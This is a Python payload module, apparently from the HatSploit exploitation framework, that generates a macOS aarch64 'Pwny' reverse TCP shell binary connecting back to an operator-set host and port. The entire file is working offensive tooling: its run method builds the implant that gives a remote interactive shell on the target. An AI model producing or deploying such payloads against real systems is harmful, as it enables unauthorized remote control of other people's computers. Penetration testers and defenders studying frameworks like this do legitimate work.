
"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from pwny import Pwny
from pwny.session import PwnySession

from hatsploit.lib.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__({
            'Name': "macOS aarch64 Pwny Reverse TCP",
            'Payload': "macos/aarch64/pwny_reverse_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': (
                "This payload creates an interactive Pwny shell for macOS "
                "with AARCH64 architecture."
            ),
            'Arch': ARCH_AARCH64,
            'Platform': OS_MACOS,
            'Session': PwnySession,
            'Type': REVERSE_TCP,
        })

    def run(self):
        return Pwny(
            target='aarch64-apple-darwin',
            options={
                'uri': f'tcp://{self.rhost.value}:{str(self.rport.value)}'
            }
        ).to_binary()
